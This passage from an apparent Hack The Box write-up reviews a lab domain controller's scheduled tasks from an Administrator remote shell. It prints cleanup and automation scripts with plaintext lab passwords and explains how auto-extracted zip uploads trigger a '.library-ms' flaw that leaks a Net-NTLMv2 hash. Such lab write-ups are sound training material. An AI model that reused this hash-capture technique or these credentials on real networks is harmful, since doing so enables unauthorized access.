\Microsoft\Windows\AppID\                      EDP Policy Manager                Ready
\Microsoft\Windows\AppID\                      PolicyConverter                   Disabled
\Microsoft\Windows\AppID\                      VerifiedPublisherCertStoreCheck   Disabled
\Microsoft\Windows\Application Experience\     Microsoft Compatibility Appraiser Ready
\Microsoft\Windows\Application Experience\     PcaPatchDbTask                    Ready
\Microsoft\Windows\Application Experience\     ProgramDataUpdater                Ready
\Microsoft\Windows\Application Experience\     StartupAppTask                    Ready
\Microsoft\Windows\ApplicationData\            appuriverifierdaily               Ready
\Microsoft\Windows\ApplicationData\            appuriverifierinstall             Ready
\Microsoft\Windows\ApplicationData\            CleanupTemporaryState             Ready
\Microsoft\Windows\ApplicationData\            DsSvcCleanup                      Ready
\Microsoft\Windows\AppxDeploymentClient\       Pre-staged app cleanup            Disabled
\Microsoft\Windows\Autochk\                    Proxy                             Ready
\Microsoft\Windows\BitLocker\                  BitLocker Encrypt All Drives      Ready
\Microsoft\Windows\BitLocker\                  BitLocker MDM policy Refresh      Ready
\Microsoft\Windows\Bluetooth\                  UninstallDeviceTask               Disabled
\Microsoft\Windows\BrokerInfrastructure\       BgTaskRegistrationMaintenanceTask Ready
\Microsoft\Windows\CertificateServicesClient\  AikCertEnrollTask                 Ready
\Microsoft\Windows\CertificateServicesClient\  CryptoPolicyTask                  Ready
\Microsoft\Windows\CertificateServicesClient\  KeyPreGenTask                     Ready
\Microsoft\Windows\CertificateServicesClient\  SystemTask                        Ready
\Microsoft\Windows\CertificateServicesClient\  UserTask                          Ready
\Microsoft\Windows\CertificateServicesClient\  UserTask-Roam                     Ready
\Microsoft\Windows\Chkdsk\                     ProactiveScan                     Ready
\Microsoft\Windows\Chkdsk\                     SyspartRepair                     Ready
\Microsoft\Windows\Clip\                       License Validation                Disabled
\Microsoft\Windows\CloudExperienceHost\        CreateObjectTask                  Ready
\Microsoft\Windows\Customer Experience Impr... Consolidator                      Ready
\Microsoft\Windows\Customer Experience Impr... UsbCeip                           Ready
\Microsoft\Windows\Data Integrity Scan\        Data Integrity Check And Scan     Ready
\Microsoft\Windows\Data Integrity Scan\        Data Integrity Scan               Ready
\Microsoft\Windows\Data Integrity Scan\        Data Integrity Scan for Crash ... Ready
\Microsoft\Windows\Defrag\                     ScheduledDefrag                   Ready
\Microsoft\Windows\Device Information\         Device                            Ready
\Microsoft\Windows\Device Information\         Device User                       Ready
\Microsoft\Windows\Device Setup\               Metadata Refresh                  Ready
\Microsoft\Windows\Diagnosis\                  Scheduled                         Ready
\Microsoft\Windows\DirectX\                    DirectXDatabaseUpdater            Ready
\Microsoft\Windows\DirectX\                    DXGIAdapterCache                  Ready
\Microsoft\Windows\DiskCleanup\                SilentCleanup                     Ready
\Microsoft\Windows\DiskDiagnostic\             Microsoft-Windows-DiskDiagnost... Ready
\Microsoft\Windows\DiskDiagnostic\             Microsoft-Windows-DiskDiagnost... Disabled
\Microsoft\Windows\DiskFootprint\              Diagnostics                       Ready
\Microsoft\Windows\DiskFootprint\              StorageSense                      Ready
\Microsoft\Windows\EDP\                        EDP App Launch Task               Ready
\Microsoft\Windows\EDP\                        EDP Auth Task                     Ready
\Microsoft\Windows\EDP\                        EDP Inaccessible Credentials Task Ready
\Microsoft\Windows\EDP\                        StorageCardEncryption Task        Ready
\Microsoft\Windows\ExploitGuard\               ExploitGuard MDM policy Refresh   Ready
\Microsoft\Windows\File Classification Infr... Property Definition Sync          Disabled
\Microsoft\Windows\Flighting\FeatureConfig\    ReconcileFeatures                 Ready
\Microsoft\Windows\Flighting\FeatureConfig\    UsageDataFlushing                 Ready
\Microsoft\Windows\Flighting\FeatureConfig\    UsageDataReporting                Ready
\Microsoft\Windows\Flighting\OneSettings\      RefreshCache                      Ready
\Microsoft\Windows\Input\                      LocalUserSyncDataAvailable        Ready
\Microsoft\Windows\Input\                      MouseSyncDataAvailable            Ready
\Microsoft\Windows\Input\                      PenSyncDataAvailable              Ready
\Microsoft\Windows\Input\                      TouchpadSyncDataAvailable         Ready
\Microsoft\Windows\InstallService\             ScanForUpdates                    Disabled
\Microsoft\Windows\InstallService\             ScanForUpdatesAsUser              Disabled
\Microsoft\Windows\InstallService\             SmartRetry                        Disabled
\Microsoft\Windows\InstallService\             WakeUpAndContinueUpdates          Disabled
\Microsoft\Windows\InstallService\             WakeUpAndScanForUpdates           Disabled
\Microsoft\Windows\International\              Synchronize Language Settings     Ready
\Microsoft\Windows\LanguageComponentsInstal... Installation                      Ready
\Microsoft\Windows\LanguageComponentsInstal... Uninstallation                    Disabled
\Microsoft\Windows\License Manager\            TempSignedLicenseExchange         Ready
\Microsoft\Windows\Location\                   Notifications                     Ready
\Microsoft\Windows\Location\                   WindowsActionDialog               Ready
\Microsoft\Windows\Maintenance\                WinSAT                            Ready
\Microsoft\Windows\Maps\                       MapsToastTask                     Disabled
\Microsoft\Windows\Maps\                       MapsUpdateTask                    Disabled
\Microsoft\Windows\MemoryDiagnostic\           ProcessMemoryDiagnosticEvents     Disabled
\Microsoft\Windows\MemoryDiagnostic\           RunFullMemoryDiagnostic           Disabled
\Microsoft\Windows\MUI\                        LPRemove                          Ready
\Microsoft\Windows\Multimedia\                 SystemSoundsService               Disabled
\Microsoft\Windows\NetTrace\                   GatherNetworkInfo                 Ready
\Microsoft\Windows\Network Controller\         SDN Diagnostics Task              Disabled
\Microsoft\Windows\Offline Files\              Background Synchronization        Disabled
\Microsoft\Windows\Offline Files\              Logon Synchronization             Disabled
\Microsoft\Windows\PI\                         Secure-Boot-Update                Ready
\Microsoft\Windows\PI\                         SecureBootEncodeUEFI              Ready
\Microsoft\Windows\PI\                         Sqm-Tasks                         Ready
\Microsoft\Windows\PLA\                        Server Manager Performance Mon... Disabled
\Microsoft\Windows\Plug and Play\              Device Install Group Policy       Ready
\Microsoft\Windows\Plug and Play\              Device Install Reboot Required    Ready
\Microsoft\Windows\Plug and Play\              Sysprep Generalize Drivers        Ready
\Microsoft\Windows\Power Efficiency Diagnos... AnalyzeSystem                     Queued
\Microsoft\Windows\PushToInstall\              LoginCheck                        Disabled
\Microsoft\Windows\PushToInstall\              Registration                      Disabled
\Microsoft\Windows\Ras\                        MobilityManager                   Ready
\Microsoft\Windows\RecoveryEnvironment\        VerifyWinRE                       Disabled
\Microsoft\Windows\Registry\                   RegIdleBackup                     Ready
\Microsoft\Windows\Server Manager\             CleanupOldPerfLogs                Ready
\Microsoft\Windows\Server Manager\             ServerManager                     Ready
\Microsoft\Windows\Servicing\                  StartComponentCleanup             Running
\Microsoft\Windows\SharedPC\                   Account Cleanup                   Disabled
\Microsoft\Windows\Shell\                      CreateObjectTask                  Ready
\Microsoft\Windows\Shell\                      IndexerAutomaticMaintenance       Ready
\Microsoft\Windows\Shell\                      UpdateUserPictureTask             Ready
\Microsoft\Windows\Software Inventory Logging\ Collection                        Disabled
\Microsoft\Windows\Software Inventory Logging\ Configuration                     Ready
\Microsoft\Windows\SoftwareProtectionPlatform\ SvcRestartTask                    Ready
\Microsoft\Windows\SoftwareProtectionPlatform\ SvcRestartTaskLogon               Ready
\Microsoft\Windows\SoftwareProtectionPlatform\ SvcRestartTaskNetwork             Ready
\Microsoft\Windows\SpacePort\                  SpaceAgentTask                    Ready
\Microsoft\Windows\SpacePort\                  SpaceManagerTask                  Ready
\Microsoft\Windows\Speech\                     SpeechModelDownloadTask           Ready
\Microsoft\Windows\StateRepository\            MaintenanceTasks                  Ready
\Microsoft\Windows\Storage Tiers Management\   Storage Tiers Management Initi... Ready
\Microsoft\Windows\Storage Tiers Management\   Storage Tiers Optimization        Disabled
\Microsoft\Windows\Task Manager\               Interactive                       Ready
\Microsoft\Windows\TextServicesFramework\      MsCtfMonitor                      Ready
\Microsoft\Windows\Time Synchronization\       ForceSynchronizeTime              Ready
\Microsoft\Windows\Time Synchronization\       SynchronizeTime                   Ready
\Microsoft\Windows\Time Zone\                  SynchronizeTimeZone               Ready
\Microsoft\Windows\TPM\                        Tpm-HASCertRetr                   Ready
\Microsoft\Windows\TPM\                        Tpm-Maintenance                   Ready
\Microsoft\Windows\UpdateOrchestrator\         Report policies                   Ready
\Microsoft\Windows\UpdateOrchestrator\         Schedule Maintenance Work         Disabled
\Microsoft\Windows\UpdateOrchestrator\         Schedule Scan                     Ready
\Microsoft\Windows\UpdateOrchestrator\         Schedule Scan Static Task         Ready
\Microsoft\Windows\UpdateOrchestrator\         Schedule Wake To Work             Disabled
\Microsoft\Windows\UpdateOrchestrator\         Schedule Work                     Disabled
\Microsoft\Windows\UpdateOrchestrator\         USO_UxBroker                      Ready
\Microsoft\Windows\UpdateOrchestrator\         UUS Failover Task                 Ready
\Microsoft\Windows\UPnP\                       UPnPHostConfig                    Disabled
\Microsoft\Windows\User Profile Service\       HiveUploadTask                    Disabled
\Microsoft\Windows\WaaSMedic\                  PerformRemediation                Disabled
\Microsoft\Windows\WDI\                        ResolutionHost                    Ready
\Microsoft\Windows\Windows Defender\           Windows Defender Cache Mainten... Ready
\Microsoft\Windows\Windows Defender\           Windows Defender Cleanup          Ready
\Microsoft\Windows\Windows Defender\           Windows Defender Scheduled Scan   Ready
\Microsoft\Windows\Windows Defender\           Windows Defender Verification     Ready
\Microsoft\Windows\Windows Error Reporting\    QueueReporting                    Ready
\Microsoft\Windows\Windows Filtering Platform\ BfeOnServiceStartTypeChange       Ready
\Microsoft\Windows\Windows Media Sharing\      UpdateLibrary                     Ready
\Microsoft\Windows\WindowsColorSystem\         Calibration Loader                Ready
\Microsoft\Windows\WindowsUpdate\              Refresh Group Policy Cache        Ready
\Microsoft\Windows\WindowsUpdate\              Scheduled Start                   Ready
\Microsoft\Windows\Wininet\                    CacheTask                         Ready
\Microsoft\Windows\Workplace Join\             Automatic-Device-Join             Ready
\Microsoft\Windows\Workplace Join\             Device-Sync                       Disabled
\Microsoft\Windows\Workplace Join\             Recovery-Check                    Disabled
\Microsoft\Windows\WwanSvc\                    OobeDiscovery                     Ready
```

The interesting ones are:

- `ad_cleanup`
- `CleaningUp`
- `script01`
- `script02`

### ad_cleanup

I’ll get the command run by the script referencing the `Actions` object on the task:

```console
evil-winrm-py PS C:\> (Get-ScheduledTask -TaskName "CleaningUp").Actions | Format-Table Execute,Arguments

Execute        Arguments
-------        ---------
powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Links\cleaning_up.ps1
```

Several of these scripts are located in the Administrator’s `Links` directory:

```console
evil-winrm-py PS C:\Users\Administrator\Links> ls

    Directory: C:\Users\Administrator\Links

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/9/2025   4:27 PM            274 ad_cleanup.ps1
-a----          4/9/2025   4:27 PM            377 cleaning_up.ps1
-a----          4/2/2025   6:22 PM            518 Desktop.lnk
-a----          4/2/2025   6:22 PM            975 Downloads.lnk
-a----         4/11/2025  10:43 AM           1817 script_01.ps1
```

`ad_cleanup.ps1` removes the web_svc user from the IT_Support group, and resets the password of the monitoring_svc user:

```powershell
# Remove user web_svc from the group IT_Support
net group "IT_Support" web_svc  /del

# reset the password of monitoring_svc user
Set-ADAccountPassword -Identity "monitoring_svc" -NewPassword (ConvertTo-SecureString "M-0-N-I-T-0-R-I-N-G@!" -AsPlainText -Force) -Reset
```

This machine released before every HTB player got a dedicated instance, and therefore these cleanups were necessary to prevent players from spoiling the box for other players on the same machine.

`Get-ScheduledTaskInfo` will show that last and next run time:

```console
evil-winrm-py PS C:\> Get-ScheduledTaskInfo -TaskName "ad_cleanup"

LastRunTime        : 6/17/2026 7:48:48 PM
LastTaskResult     : 0
NextRunTime        : 6/17/2026 7:53:53 PM
NumberOfMissedRuns : 0
TaskName           : ad_cleanup
TaskPath           :
PSComputerName     :
```

That shows it is likely running every 5 minutes. For tasks that have a regularly run, I can see that setting in `Triggers.Repetition.Interval`:

```console
evil-winrm-py PS C:\Users\Administrator\Links> (Get-ScheduledTask -TaskName "ad_cleanup").Triggers.Repetition.Interval
PT5M
```

`PT5M` means five minutes.

### CleaningUp

The `CleaningUp` task runs `cleaning_up.ps1` from the same directory:

```console
evil-winrm-py PS C:\> (Get-ScheduledTask -TaskName "CleaningUp").Actions | Format-Table Execute,Arguments

Execute        Arguments
-------        ---------
powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Links\cleaning_up.ps1
```

This clears out the seeded scripts from `C:\Windows\Temp`:

```powershell
# Clean up cmk_all_*_1.cmd and cmk_data_*_2.cmd in C:\Windows\Temp
$patterns = @("cmk_all_*_1.cmd", "cmk_data_*_2.cmd")

foreach ($pattern in $patterns) {
    Get-ChildItem -Path "C:\Windows\Temp" -Filter $pattern -File | ForEach-Object {
        if ($_.IsReadOnly) {
            $_.IsReadOnly = $false
        }
        Remove-Item -Path $_.FullName -Force
    }
}
```

I wonder a bit about the necessity of this, given that users can’t list files inside of `C:\Windows\Temp`, but I guess they can read specific files, and could see other players files potentially.

This one runs every two minutes:

```console
evil-winrm-py PS C:\Users\Administrator\Links> (Get-ScheduledTask -TaskName "CleaningUp").Triggers.Repetition.Interval
PT2M
```

### script01

This is another script from the Administrator’s `Links` directory:

```console
evil-winrm-py PS C:\> (Get-ScheduledTask -TaskName "script01").Actions | Format-Table Execute,Arguments

Execute        Arguments
-------        ---------
powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Links\script_01.ps1
```

This script is responsible for making sure that the web_svc user has an active but disconnected RDP session on the box:

```powershell
# Clear existing RDP credentials for the specified target
cmdkey /list | ForEach-Object {
    if ($_ -like "*target=TERMSRV/*") {
        cmdkey /del:($_ -replace " ","" -replace "Target:","")
    }
}

# Define RDP connection parameters
$Server = "nanocorp.htb"
$User = "web_svc"
$Password = "dksehdgh712!@#"

# Function to check if the user "web_svc" is active
function Check-UserActive {
    $output = qwinsta /server:$Server
    return $output | Select-String -Pattern "web_svc"
}

# Function to check if user is a member of "Remote Desktop Users" group
function Is-UserInRDPGroup {
    $groupMembers = Get-ADGroupMember -Identity "Remote Desktop Users"
    return $groupMembers | Where-Object { $_.SamAccountName -eq $User }
}

# Store RDP credentials
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password

# Add user to Remote Desktop Users group (if not already added)
if (-not (Is-UserInRDPGroup)) {
    Add-ADGroupMember -Identity "Remote Desktop Users" -Members $User
}

# Check if the user is active before proceeding
$userActive = Check-UserActive

if ($userActive) {
    Write-Output "User '$User' is already active on $Server. No action needed."

    # Remove the user from Remote Desktop Users group
    Remove-ADGroupMember -Identity "Remote Desktop Users" -Members $User -Confirm:$false
    Write-Output "User '$User' has been removed from RDP group."
} else {
    Write-Output "User '$User' is not active on $Server. Proceeding with RDP connection."

    # Initiate RDP connection
    Start-Process "mstsc" -ArgumentList "/v:$Server"

    # Wait for RDP to start
    Start-Sleep -Seconds 40

    # Close the RDP session (this assumes mstsc window has started)
    Stop-Process -Name mstsc -Force
    Write-Output "RDP session closed."

}
```

The full activity is split across two runs.

On a run where web_svc has no session (the `else` branch at the bottom), it will store the creds with `cmdkey`, add the user to Remote Desktop Users, launch `mstsc` (the RDP client), sleep 40 seconds, and then kill `mstsc`.

On the run where there is a session, it removes the user from Remote Desktop Users.

This runs every minute:

```console
evil-winrm-py PS C:\Users\Administrator\Links> (Get-ScheduledTask -TaskName "script01").Triggers.Repetition.Interval
PT1M
```

web_svc normally can’t RDP (it’s not in Remote Desktop Users), so the script bootstraps a session in a roundabout way: it stores web_svc’s creds with cmdkey, temporarily adds the user to the RDP group, and has the DC RDP into itself via mstsc. After 40 seconds it kills the mstsc client, leaving the server-side session logged on but disconnected. Because it’s running every minute, it will be probably around 10 seconds or less before the next run occurs, detecting an active session and removing web_svc from the RDP group again. Successive runs will continue to see the active session, until it times out, where it will fall back to adding the group to create the connection. The goal is to leave the user in the RDP group as little as possible.

One thing worth noting is that I actually broke the running of this task when I reset the Administrator password! The info on the task shows the last run time a while ago, while the next run time keeps being in the next minute:

```console
evil-winrm-py PS C:\> Get-ScheduledTaskInfo -TaskName "script01"

LastRunTime        : 6/17/2026 5:58:58 PM
LastTaskResult     : 0
NextRunTime        : 6/17/2026 7:21:21 PM
NumberOfMissedRuns : 82
TaskName           : script01
TaskPath           :
PSComputerName     :
evil-winrm-py PS C:\Users\Administrator\Links> date
Wednesday, June 17, 2026 7:21:02 PM
```

### script02

The `script02` script is in the web_svc user’s `Links` directory:

```console
evil-winrm-py PS C:\> (Get-ScheduledTask -TaskName "script02").Actions | Format-Table Execute,Arguments

Execute        Arguments
-------        ---------
powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\web_svc\Links\script_02.ps1
```

As Administrator or web_svc I can check out `C:\Users\web_svc`:

```console
evil-winrm-py PS C:\Users\web_svc> tree /f
Folder PATH listing
Volume serial number is 2EB6-7759
C:.
+---3D Objects
+---Contacts
+---Desktop
+---Documents
+---Downloads
+---Favorites
¦   ¦   Bing.url
¦   ¦
¦   +---Links
+---Links
¦       Desktop.lnk
¦       Downloads.lnk
¦       script_02.ps1
¦
+---Music
+---Pictures
+---Saved Games
+---Searches
+---Videos
```

It’s basically empty, other than `script_02.ps1`.

This script is responsible for opening the uploaded zip archives:

```powershell
$uploadPath = "C:\xampp\htdocs\hire\uploads"
$extractTool = "C:\Program Files\WinRAR\WinRAR.exe"

# Get only .zip files
$zipFiles = Get-ChildItem "$uploadPath\*.zip" -File

foreach ($zip in $zipFiles) {
    # Create a random folder name for extraction
    $randomFolder = [System.IO.Path]::Combine($uploadPath, [System.IO.Path]::GetRandomFileName())
    New-Item -Path $randomFolder -ItemType Directory | Out-Null

    # Extract using WinRAR
    & "$extractTool" x -ibck "$($zip.FullName)" "$randomFolder\"

    # Open extracted folder
    $explorer = Start-Process explorer.exe -ArgumentList "`"$randomFolder`"" -PassThru

    # Wait 5 seconds
    Start-Sleep -Seconds 5

    # Kill only the explorer window opened
    try {
        $explorer | Stop-Process -Force
    } catch {
        Write-Host "Explorer already closed or failed to stop."
    }

    # Delete the temp folder
    Remove-Item -Path $randomFolder -Recurse -Force
    Remove-Item -Path $zip.FullName -Force

    Write-Host "Done with: $($zip.Name)`n"
}
```

This script looks for zip archives in the `uploads` folder, and then loops over them. It creates a random directory, and then uses `WinRAR.exe` to extract the files into it. It then opens `Explorer.exe` in that directory, which is enough to trigger the vulnerability rendering the `.library-ms` file. It sleeps for 5 seconds to let that happen, then kills `explorer` and deletes the temp directory and the original archive.

This task runs in web_svc’s context, the same account the `StartApacheAsWebSvc` task uses to run the Apache web server. Because the `explorer.exe` it launches authenticates as web_svc, the Net-NTLMv2 hash I captured back at the foothold was web_svc’s.
